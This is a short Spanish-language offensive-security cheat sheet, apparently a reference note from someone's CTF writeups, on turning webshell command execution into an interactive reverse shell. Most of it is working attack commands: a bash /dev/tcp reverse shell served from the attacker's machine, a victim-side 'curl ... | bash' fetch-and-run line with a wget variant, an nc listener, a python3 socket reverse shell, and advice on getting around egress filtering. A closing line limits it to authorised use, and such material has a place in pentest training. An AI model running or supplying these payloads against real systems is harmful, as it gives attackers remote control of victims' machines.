# Magic Rev Shell — reverse shell fiable desde un webshell (`curl | bash`)

Técnica para pasar de un **webshell** (ejecución de comandos por HTTP) a una **reverse shell interactiva**, sin pelearse con comillas ni URL-encoding. Es mi método por defecto cuando tengo RCE por web.

> **Referencia rápida:** en mis writeups enlazo aquí en vez de repetir el procedimiento.

## El problema
Un webshell ejecuta **un comando por petición HTTP**: no hay stdin persistente, así que **no es interactivo**. Dos consecuencias:
1. Los reverse shell *inline* (`bash -i >& /dev/tcp/...`) fallan a menudo porque el **webshell mutila las comillas y los caracteres especiales** (`>&`, `&`, comillas, espacios) al pasarlos por la URL.
2. No puedes "upgradear" un webshell con `python3 -c 'pty.spawn(...)'` ni `script`: al no haber TTY, **la petición se cuelga para siempre** esperando una entrada que no llega.

## La técnica
El payload "feo" vive en un **fichero servido desde tu máquina**; el webshell solo hace un `curl` limpio.

```bash
# ── ATACANTE (Kali) ──
echo 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1' > shell.sh   # payload en un fichero
python3 -m http.server 80                                 # sirve el fichero (80 = permisivo para egress)
nc -lvnp 4444                                             # (otra terminal) listener

# ── VÍCTIMA (webshell) ──
curl http://<TU_IP>/shell.sh | bash
# sin curl:  wget -qO- http://<TU_IP>/shell.sh | bash
```
Una vez cae la reverse, **ahí sí** estabilizas:
```bash
script -qc /bin/bash /dev/null        # o: python3 -c 'import pty;pty.spawn("/bin/bash")' + stty
```

## Diagnóstico gratis (mirando el log del `http.server`)
- Ves `GET /shell.sh 200` → la víctima **sale** hacia ti (egress del fetch OK) y descargó el payload.
- **No** ves el GET → no te alcanza → problema de red/IP (revisa la interfaz del VPN).
- GET OK pero el `nc` no recibe nada → **egress filtrado en 4444** → cambia el puerto del `shell.sh` a **443** (y `nc -lvnp 443`).

## Fallback con Python (si `bash /dev/tcp` no conecta y hay python3)
Trae TTY de serie:
```bash
echo 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"<TU_IP>\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")"' > shell.sh
```

## Por qué funciona
El webshell nunca ve caracteres conflictivos: solo `curl http://ip/shell.sh | bash`. Todo lo delicado está en el fichero, que `bash` interpreta ya en la víctima con su shell real. De paso, el `http.server` te da **telemetría de egress** sin herramientas extra.

---
<sub>Material educativo. Úsalo solo en entornos propios o con permiso explícito.</sub>
